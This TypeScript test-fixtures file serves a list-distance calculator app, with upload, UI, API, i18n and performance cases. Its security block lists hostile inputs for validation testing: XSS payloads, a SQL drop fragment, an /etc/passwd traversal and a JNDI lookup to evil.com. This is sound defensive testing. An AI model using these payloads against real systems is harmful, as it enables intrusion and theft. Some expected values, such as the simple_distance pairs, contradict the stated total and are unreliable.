// Test data fixtures for Chronicler application testing
export interface TestFixture<T> {
  name: string;
  description: string;
  data: T;
  expectedResult?: any;
  metadata?: Record<string, any>;
}

// Distance calculation test data
export const distanceCalculationFixtures: TestFixture<{
  list1: number[];
  list2: number[];
}>[] = [
  {
    name: 'simple_distance',
    description: 'Basic distance calculation with small arrays',
    data: {
      list1: [3, 4, 2, 1, 3, 3],
      list2: [4, 3, 5, 3, 9, 3]
    },
    expectedResult: {
      totalDistance: 11,
      pairs: [
        { left: 1, right: 3, distance: 2 },
        { left: 2, right: 3, distance: 1 },
        { left: 3, right: 4, distance: 1 },
        { left: 3, right: 5, distance: 2 },
        { left: 3, right: 9, distance: 6 },
        { left: 4, right: 3, distance: 1 }
      ]
    },
    metadata: { source: 'PRP specification example' }
  },
  {
    name: 'identical_lists',
    description: 'Lists with identical elements should have zero distance',
    data: {
      list1: [1, 2, 3, 4, 5],
      list2: [1, 2, 3, 4, 5]
    },
    expectedResult: {
      totalDistance: 0
    }
  },
  {
    name: 'reverse_order',
    description: 'Lists in reverse order',
    data: {
      list1: [1, 2, 3, 4, 5],
      list2: [5, 4, 3, 2, 1]
    },
    expectedResult: {
      totalDistance: 0 // After sorting, they should be identical
    }
  },
  {
    name: 'large_numbers',
    description: 'Test with large number values',
    data: {
      list1: [1000000, 999999, 1000001],
      list2: [1000002, 999998, 1000000]
    }
  },
  {
    name: 'negative_numbers',
    description: 'Test with negative numbers',
    data: {
      list1: [-5, -3, -1, 0, 2],
      list2: [-4, -2, 0, 1, 3]
    }
  },
  {
    name: 'single_element',
    description: 'Single element arrays',
    data: {
      list1: [42],
      list2: [13]
    },
    expectedResult: {
      totalDistance: 29
    }
  },
  {
    name: 'empty_arrays',
    description: 'Empty arrays for error testing',
    data: {
      list1: [],
      list2: []
    },
    metadata: { shouldThrow: true, errorType: 'ValidationError' }
  }
];

// Performance test data generators
export class PerformanceDataGenerator {
  static generateLargeDataset(size: number): { list1: number[]; list2: number[] } {
    const list1: number[] = [];
    const list2: number[] = [];
    
    for (let i = 0; i < size; i++) {
      list1.push(Math.floor(Math.random() * 1000000));
      list2.push(Math.floor(Math.random() * 1000000));
    }
    
    return { list1, list2 };
  }
  
  static generateSortedDataset(size: number): { list1: number[]; list2: number[] } {
    const list1: number[] = [];
    const list2: number[] = [];
    
    for (let i = 0; i < size; i++) {
      list1.push(i);
      list2.push(i + Math.floor(Math.random() * 10));
    }
    
    return { list1, list2 };
  }
  
  static generateWorstCaseDataset(size: number): { list1: number[]; list2: number[] } {
    const list1: number[] = [];
    const list2: number[] = [];
    
    // Create arrays that result in maximum distance
    for (let i = 0; i < size; i++) {
      list1.push(i);
      list2.push(size - i - 1);
    }
    
    return { list1, list2 };
  }
}

// File upload test fixtures
export const fileUploadFixtures: TestFixture<{
  filename: string;
  content: string;
  mimetype: string;
  size: number;
}>[] = [
  {
    name: 'valid_text_file',
    description: 'Valid text file with proper format',
    data: {
      filename: 'test_data.txt',
      content: '3 4\n4 3\n2 5\n1 3\n3 9\n3 3',
      mimetype: 'text/plain',
      size: 24
    },
    expectedResult: { success: true }
  },
  {
    name: 'invalid_file_type',
    description: 'Invalid file type (not text)',
    data: {
      filename: 'test.pdf',
      content: '%PDF-1.4 binary content',
      mimetype: 'application/pdf',
      size: 1024
    },
    metadata: { shouldThrow: true, errorType: 'FileValidationError' }
  },
  {
    name: 'oversized_file',
    description: 'File exceeding size limit',
    data: {
      filename: 'large_file.txt',
      content: 'x'.repeat(11 * 1024 * 1024), // 11MB
      mimetype: 'text/plain',
      size: 11 * 1024 * 1024
    },
    metadata: { shouldThrow: true, errorType: 'FileSizeError' }
  },
  {
    name: 'malformed_content',
    description: 'File with malformed data format',
    data: {
      filename: 'malformed.txt',
      content: 'not numbers\ninvalid format\nabc def',
      mimetype: 'text/plain',
      size: 35
    },
    metadata: { shouldThrow: true, errorType: 'ContentValidationError' }
  },
  {
    name: 'empty_file',
    description: 'Empty file content',
    data: {
      filename: 'empty.txt',
      content: '',
      mimetype: 'text/plain',
      size: 0
    },
    metadata: { shouldThrow: true, errorType: 'EmptyFileError' }
  }
];

// UI component test fixtures
export const uiComponentFixtures = {
  fileUploadComponent: {
    props: {
      onFileSelect: jest.fn(),
      onUploadComplete: jest.fn(),
      disabled: false,
      acceptedFileTypes: ['.txt'],
      maxFileSize: 10 * 1024 * 1024
    },
    mockFiles: [
      new File(['3 4\n4 3\n2 5'], 'test.txt', { type: 'text/plain' }),
      new File(['invalid content'], 'test.pdf', { type: 'application/pdf' })
    ]
  },
  
  resultsDisplayComponent: {
    validResult: {
      totalDistance: 11,
      pairs: [
        { left: 1, right: 3, distance: 2 },
        { left: 2, right: 3, distance: 1 }
      ],
      metadata: {
        leftListSize: 6,
        rightListSize: 6,
        processingTimeMs: 2
      }
    },
    
    loadingState: {
      isLoading: true,
      progress: 50
    },
    
    errorState: {
      error: {
        message: 'Validation failed: Lists must have equal length',
        code: 'VALIDATION_ERROR',
        timestamp: '2025-07-30T12:00:00Z'
      }
    }
  }
};

// API response fixtures
export const apiResponseFixtures = {
  successResponse: {
    success: true,
    data: {
      totalDistance: 11,
      pairs: [
        { left: 1, right: 3, distance: 2 },
        { left: 2, right: 3, distance: 1 }
      ],
      metadata: {
        leftListSize: 6,
        rightListSize: 6,
        processingTimeMs: 2
      }
    },
    timestamp: '2025-07-30T12:00:00Z'
  },
  
  validationErrorResponse: {
    success: false,
    error: {
      message: 'Validation failed: Lists must have equal length',
      code: 'VALIDATION_ERROR',
      details: {
        list1Length: 6,
        list2Length: 5
      }
    },
    timestamp: '2025-07-30T12:00:00Z'
  },
  
  rateLimitErrorResponse: {
    success: false,
    error: {
      message: 'Too many requests. Please try again later.',
      code: 'RATE_LIMITED',
      retryAfter: 60
    },
    timestamp: '2025-07-30T12:00:00Z'
  }
};

// Internationalization test fixtures
export const i18nFixtures = {
  englishTranslations: {
    'upload.title': 'Submit Chronicle Lists',
    'upload.dragAndDrop': 'Drag and drop files here',
    'results.totalDistance': 'Total Distance',
    'error.validation': 'Validation Error'
  },
  
  sindarinTranslations: {
    'upload.title': 'Orthad i Glîn', // Submit the lists
    'upload.dragAndDrop': 'Drego ah thored i chuil', // Drag and drop the files
    'results.totalDistance': 'Aphadon Iaur', // Total distance
    'error.validation': 'Goth Tangada' // Validation error
  },
  
  tengwarTranslations: {
    'upload.title': '\uE001\uE020\uE008\uE001\uE004', // Tengwar characters
    'results.totalDistance': '\uE001\uE020\uE008\uE001\uE004'
  }
};

// Security test fixtures
export const securityTestFixtures = {
  maliciousInputs: [
    '<script>alert("xss")</script>',
    'DROP TABLE users;',
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '\x00\x01\x02\x03', // Null bytes and control characters
    'eval(Math.random())',
    'javascript:alert(1)',
    '"><img src=x onerror=alert(1)>'
  ],
  
  validationBypassAttempts: [
    { list1: 'not an array', list2: [1, 2, 3] },
    { list1: [1, 2], list2: 'not an array' },
    { list1: [NaN, Infinity], list2: [-Infinity, undefined] },
    { list1: [1e308, -1e308], list2: [Number.MAX_VALUE, Number.MIN_VALUE] }
  ],
  
  rateLimitTests: {
    burstRequests: 150, // Exceeds default limit of 100
    timeWindow: 60000,  // 1 minute
    expectedBlockAfter: 100
  }
};

// Export utility functions
export function getFixtureByName<T>(fixtures: TestFixture<T>[], name: string): TestFixture<T> | undefined {
  return fixtures.find(fixture => fixture.name === name);
}

export function getFixturesByTag<T>(fixtures: TestFixture<T>[], tag: string): TestFixture<T>[] {
  return fixtures.filter(fixture => fixture.metadata?.tags?.includes(tag));
}

export function createMockFile(content: string, filename: string = 'test.txt', mimetype: string = 'text/plain'): File {
  return new File([content], filename, { type: mimetype });
}

// Performance benchmarking utilities
export const performanceBenchmarks = {
  // Expected performance thresholds
  thresholds: {
    smallDataset: 10,     // < 10ms for 100 elements
    mediumDataset: 100,   // < 100ms for 10K elements  
    largeDataset: 1000,   // < 1s for 100K elements
    fileUpload: 5000,     // < 5s for 10MB file
    uiRender: 16          // < 16ms for 60fps
  },
  
  dataSizes: {
    small: 100,
    medium: 10000,
    large: 100000,
    xlarge: 1000000
  }
};